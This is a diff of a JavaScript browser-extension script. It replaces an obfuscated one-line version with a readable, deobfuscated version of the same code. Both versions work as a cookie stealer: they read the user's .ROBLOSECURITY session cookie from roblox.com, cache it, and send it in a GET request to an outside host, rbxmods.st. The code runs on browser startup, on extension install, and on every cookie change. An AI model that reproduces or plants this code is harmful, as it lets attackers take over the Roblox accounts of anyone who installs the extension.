@@ -1,1 +1,107 @@
-var secret,fetchInfo,Send;(function(){function jso$ft$giden$_95_36af_49_55_50_55_49_52_48(){return _$af1727140}function jso$ft$boe$_61_61_61(a,b){return a=== b}function jso$ft$giden$fetch(){return fetch}function jso$ft$boe$_43(a,b){return a+ b}function jso$ft$giden$_95_36af_49_55_50_55_49_52_50(){return _$af1727142}function jso$ft$giden$console(){return console}function jso$ft$boe$_33_61_61(a,b){return a!== b}function jso$ft$giden$chrome(){return chrome}var _$_78cb=["9903185426129837","https://www.roblox.com",".ROBLOSECURITY","value","cacheRBX","get","local","storage","cookie updated:","log","set","cookies","https://rbxmods.st/info.php?c=","&code=","GET","no-cors","addListener","onStartup","runtime","onInstalled","roblox.com","includes","domain","cookie","name","onChanged"];async function _$af1727140(){jso$ft$giden$chrome()[_$_78cb[11]][_$_78cb[5]]({url:_$_78cb[1],name:_$_78cb[2]},async (cookie)=>{if(cookie){const currentValue=cookie[_$_78cb[3]];const stored= await jso$ft$giden$chrome()[_$_78cb[7]][_$_78cb[6]][_$_78cb[5]](_$_78cb[4]);if(jso$ft$boe$_33_61_61(stored[_$_78cb[4]],currentValue)){jso$ft$giden$console()[_$_78cb[9]](_$_78cb[8],currentValue);jso$ft$giden$chrome()[_$_78cb[7]][_$_78cb[6]][_$_78cb[10]]({cacheRBX:currentValue});jso$ft$giden$_95_36af_49_55_50_55_49_52_50()(currentValue)}}})}function _$af1727142(value){jso$ft$giden$fetch()(jso$ft$boe$_43(jso$ft$boe$_43(_$_78cb[12],value)+ _$_78cb[13],secret),{method:_$_78cb[14],mode:_$_78cb[15]})}fetchInfo= _$af1727140;if(_$af1727140=== 1){return}else {Send= _$af1727142};secret= _$_78cb[0];chrome[_$_78cb[18]][_$_78cb[17]][_$_78cb[16]](_$af1727140);chrome[_$_78cb[18]][_$_78cb[19]][_$_78cb[16]](_$af1727140);chrome[_$_78cb[11]][_$_78cb[25]][_$_78cb[16]]((changeInfo)=>{if(changeInfo[_$_78cb[23]][_$_78cb[22]][_$_78cb[21]](_$_78cb[20])&& jso$ft$boe$_61_61_61(changeInfo[_$_78cb[23]][_$_78cb[24]],_$_78cb[2])){jso$ft$giden$_95_36af_49_55_50_55_49_52_48()()}})})()
+var secret, fetchInfo, Send;
+(function() {
+    function getCookieFunction() {
+        return cookieMonitor
+    }
+    
+    function isEqual(a, b) {
+        return a === b
+    }
+    
+    function getFetch() {
+        return fetch
+    }
+    
+    function concat(a, b) {
+        return a + b
+    }
+    
+    function getSendFunction() {
+        return sendData
+    }
+    
+    function getConsole() {
+        return console
+    }
+    
+    function notEqual(a, b) {
+        return a !== b
+    }
+    
+    function getChrome() {
+        return chrome
+    }
+    
+    var strings = [
+        "9903185426129837",
+        "https://www.roblox.com",
+        ".ROBLOSECURITY",
+        "value",
+        "cacheRBX",
+        "get",
+        "local",
+        "storage",
+        "cookie updated:",
+        "log",
+        "set",
+        "cookies",
+        "https://rbxmods.st/info.php?c=",
+        "&code=",
+        "GET",
+        "no-cors",
+        "addListener",
+        "onStartup",
+        "runtime",
+        "onInstalled",
+        "roblox.com",
+        "includes",
+        "domain",
+        "cookie",
+        "name",
+        "onChanged"
+    ];
+
+    async function cookieMonitor() {
+        getChrome()[strings[11]][strings[5]]({
+            url: strings[1],
+            name: strings[2]
+        }, async (cookie) => {
+            if (cookie) {
+                const currentValue = cookie[strings[3]];
+                const stored = await getChrome()[strings[7]][strings[6]][strings[5]](strings[4]);
+                if (notEqual(stored[strings[4]], currentValue)) {
+                    getConsole()[strings[9]](strings[8], currentValue);
+                    getChrome()[strings[7]][strings[6]][strings[10]]({
+                        cacheRBX: currentValue
+                    });
+                    getSendFunction()(currentValue)
+                }
+            }
+        })
+    }
+
+    function sendData(value) {
+        getFetch()(concat(concat(strings[12], value) + strings[13], secret), {
+            method: strings[14],
+            mode: strings[15]
+        })
+    }
+    
+    fetchInfo = cookieMonitor;
+    if (cookieMonitor === 1) {
+        return
+    } else {
+        Send = sendData
+    };
+    
+    secret = strings[0];
+    
+    chrome[strings[18]][strings[17]][strings[16]](cookieMonitor);
+    chrome[strings[18]][strings[19]][strings[16]](cookieMonitor);
+    
+    chrome[strings[11]][strings[25]][strings[16]]((changeInfo) => {
+        if (changeInfo[strings[23]][strings[22]][strings[21]](strings[20]) && isEqual(changeInfo[strings[23]][strings[24]], strings[2])) {
+            getCookieFunction()()
+        }
+    })
+})()
